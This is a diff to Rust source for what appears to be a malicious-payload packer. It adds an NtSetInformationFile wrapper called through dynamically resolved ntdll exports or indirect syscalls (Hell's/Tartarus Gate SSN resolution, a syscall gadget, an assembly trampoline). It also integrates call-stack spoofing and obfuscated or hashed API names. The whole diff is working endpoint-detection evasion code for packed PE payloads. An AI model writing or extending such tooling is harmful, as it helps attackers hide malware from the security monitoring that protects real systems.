@@ -26,7 +26,8 @@ use std::collections::BTreeSet;
 use serde::{Deserialize, Serialize};
 
 use crate::error::{PackerError, Result};
-use crate::techniques::RuntimeStep;
+use crate::plan::schema::PayloadFormat;
+use crate::techniques::{stack_spoofing, RuntimeStep};
 
 use super::obfuscation::StringsConfig;
 
@@ -1115,6 +1116,74 @@ const QUEUE_APC_INDIRECT: &str = r#"    /// NtQueueApcThread(ThreadHandle, ApcRo
     }
 "#;
 
+/// `nt_set_info_file`, mode none: the ntdll export resolved dynamically.
+///
+/// The Win32 equivalent (`SetFileInformationByHandle`) takes a different class
+/// enumeration, so the native call is used verbatim in both modes.
+const SET_INFO_FILE_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type SetInfoFileFn = unsafe extern "system" fn(
+        HANDLE,
+        *mut core::ffi::c_void,
+        *const core::ffi::c_void,
+        u32,
+        i32,
+    ) -> i32;
+
+    /// NtSetInformationFile(FileHandle, &IoStatusBlock, FileInformation,
+    /// Length, FileInformationClass). None mode: resolve the export dynamically
+    /// (windows-rs does not declare it) and call it.
+    pub fn nt_set_info_file(
+        file: HANDLE,
+        io_status: *mut core::ffi::c_void,
+        info: *const core::ffi::c_void,
+        length: u32,
+        class: i32,
+    ) -> i32 {
+        let address = resolve_nt_export(&$SET_INFO_FILE_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let set_info: SetInfoFileFn = unsafe { std::mem::transmute(address) };
+        unsafe { set_info(file, io_status, info, length, class) }
+    }
+"#;
+
+/// `nt_set_info_file`, mode indirect.
+const SET_INFO_FILE_INDIRECT: &str = r#"    /// NtSetInformationFile(FileHandle, &IoStatusBlock, FileInformation,
+    /// Length, FileInformationClass).
+    pub fn nt_set_info_file(
+        file: HANDLE,
+        io_status: *mut core::ffi::c_void,
+        info: *const core::ffi::c_void,
+        length: u32,
+        class: i32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                file.0 as usize,
+                io_status as usize,
+                info as usize,
+                length as usize,
+                class as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.set_info_file,
+                *gadget,
+            )
+        }
+    }
+"#;
+
 const NT_FUNCTIONS: &[NtFunction] = &[
     NtFunction {
         name: "NtAllocateVirtualMemory",
@@ -1228,6 +1297,13 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         helper_none: QUEUE_APC_NONE,
         helper_indirect: QUEUE_APC_INDIRECT,
     },
+    NtFunction {
+        name: "NtSetInformationFile",
+        table_field: "set_info_file",
+        helper_name: "nt_set_info_file",
+        helper_none: SET_INFO_FILE_NONE,
+        helper_indirect: SET_INFO_FILE_INDIRECT,
+    },
 ];
 
 /// The Nt* function names the active techniques need, deduplicated and in the
@@ -1327,7 +1403,7 @@ pub fn render_block_with(
                      the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
                      api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
                 ),
-                render_indirect(plan, &required, strings),
+                render_indirect(plan, &required, strings, spoofing_block(pipeline, strings)),
             )
         }
     };
@@ -1434,7 +1510,7 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
     /// callers pass unused slots as `0`. The two trailing parameters land after
     /// every syscall argument, which is why they never reach the kernel.
     extern "system" {
-        fn nt_invoke(
+        fn $TRAMPOLINE_NAME$(
             arg1: usize,
             arg2: usize,
             arg3: usize,
@@ -1453,8 +1529,8 @@ const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
 
     global_asm!(
         ".intel_syntax noprefix",
-        ".global nt_invoke",
-        "nt_invoke:",
+        ".global $TRAMPOLINE_NAME$",
+        "$TRAMPOLINE_NAME$:",
         "mov r10, rcx",         // r10 = arg1 (syscall argument convention)
         "mov eax, [rsp + 96]",  // eax = SSN (arg12)
         "mov r11, [rsp + 104]", // r11 = gadget address (syscall; ret, arg13)
@@ -1497,6 +1573,7 @@ $SSN_FIELDS$
         })?;
         let _ = SSNS.set(table);
         let _ = GADGET.set(gadget);
+$SPOOFING_INIT$
         crate::tech_dbg!("syscalls", "ssn table resolved, gadget at 0x{gadget:x}");
         Ok(())
     }
@@ -1891,6 +1968,9 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let query_thread_def = strings
         .obfuscate("NtQueryInformationThread")
         .render_stub_expr("query_thread_name");
+    let set_info_file_def = strings
+        .obfuscate("NtSetInformationFile")
+        .render_stub_expr("set_info_file_name");
 
     let mut out = String::from(NONE_PRELUDE);
     for f in required {
@@ -1904,6 +1984,7 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
         .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
         .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
         .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
+        .replace("$SET_INFO_FILE_FUNC_DEF$", &set_info_file_def)
 }
 
 /// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
@@ -1913,6 +1994,7 @@ fn render_indirect(
     plan: &SyscallsConfig,
     required: &[&'static NtFunction],
     strings: &StringsConfig,
+    spoofing: Option<String>,
 ) -> String {
     let ntdll_def = strings
         .obfuscate("ntdll.dll")
@@ -1952,6 +2034,18 @@ fn render_indirect(
         helpers.push('\n');
     }
 
+    // `stack_spoofing` replaces the raw trampoline with its own `nt_invoke`,
+    // so the technique's block is emitted once, below the helpers it drives (its
+    // step module is skipped by the renderer).
+    let spoofing = match spoofing {
+        Some(block) => {
+            helpers.push_str(&block);
+            helpers.push('\n');
+            true
+        }
+        None => false,
+    };
+
     let resolver_body = match plan.resolver {
         Resolver::HellsGate => HELLS_GATE_RESOLVER
             .replace("$SSN_INIT$", init.trim_end())
@@ -1983,9 +2077,39 @@ fn render_indirect(
 
     let mut out = INDIRECT_PRELUDE
         .replace("$SSN_FIELDS$", fields.trim_end())
-        .replace("$RESOLVER_BODY$", &resolver_body);
+        .replace("$RESOLVER_BODY$", &resolver_body)
+        .replace(
+            "$SPOOFING_INIT$",
+            if spoofing {
+                "        init_stack_spoofing().map_err(|e| e.to_string())?;"
+            } else {
+                ""
+            },
+        )
+        .replace(
+            "$TRAMPOLINE_NAME$",
+            if spoofing {
+                "nt_invoke_raw"
+            } else {
+                "nt_invoke"
+            },
+        );
     out.push_str(&helpers);
     out
+}
+
+/// The rendered `stack_spoofing` block, when the runtime selects that technique.
+///
+/// `None` for every other runtime, which is what leaves the raw trampoline in
+/// place under its usual `nt_invoke` name.
+fn spoofing_block(pipeline: &[RuntimeStep], strings: &StringsConfig) -> Option<String> {
+    pipeline
+        .iter()
+        .find(|step| step.name() == stack_spoofing::DEF.name)
+        .map(|step| {
+            step.technique
+                .render_fragment(strings, PayloadFormat::Pe, None)
+        })
 }
 
 /// Extracts the SSN from a Hell's Gate stub prologue.
